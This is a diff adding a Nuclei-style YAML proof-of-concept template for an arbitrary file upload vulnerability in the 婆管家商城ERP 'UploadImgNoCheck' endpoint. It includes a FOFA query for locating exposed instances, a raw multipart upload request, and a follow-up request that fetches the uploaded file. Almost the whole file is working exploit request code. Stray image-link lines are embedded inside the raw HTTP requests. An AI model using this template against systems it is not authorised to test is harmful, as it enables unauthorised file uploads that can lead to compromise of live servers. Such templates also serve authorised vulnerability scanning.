@@ -1,0 +1,76 @@
+id: poc-rgg5dgw446zk69bc
+info:
+  name: 婆管家商城ERP uploadimgnocheck 存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rgg5dgw446zk69bc'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rgg5dgw446zk69bc
+    fofa: body="/Utility/JSHeadJump.js"
+http:
+- raw:
+  - 'POST /api/Upload/UploadImgNoCheck?m_server_name=ShopUserImg HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+
+    Connection: close
+
+    Content-Length: 226
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+
+    Content-Type: multipart/form-data; boundary=---------------------------58nlgtjoht3z43rf5hn3
+
+    Accept-Encoding: gzip, deflate, br
+
+
+    -----------------------------58nlgtjoht3z43rf5hn3
+
+    Content-Disposition: form-data; name="Filedata"; filename="bpor8tnhz9.txt"
+
+    Content-Type: image/jpeg
+
+
+    GIF89a
+
+    12345678
+
+    -----------------------------58nlgtjoht3z43rf5hn3--
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1733226566235-aa25fc06-08df-4276-8748-a443e23adb91.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /Storage/UserFileImg/566ef80c6194469f9388847c1b14a6e2.txt HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+
+    Cache-Control: max-age=0
+
+    Connection: close
+
+    Range: bytes=0-100
+
+    Upgrade-Insecure-Requests: 1
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1733226566502-cd385d5f-80d0-4ba4-9398-082db1f1a7af.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
